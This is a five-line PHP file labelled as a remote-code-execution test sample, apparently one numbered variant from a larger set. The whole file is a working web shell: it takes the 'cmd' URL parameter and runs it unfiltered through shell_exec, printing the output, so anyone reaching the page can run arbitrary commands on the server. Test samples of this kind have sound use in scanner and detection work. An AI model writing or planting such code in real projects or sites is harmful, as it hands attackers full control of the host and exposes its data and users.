<?php
// RCE test variation #258
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>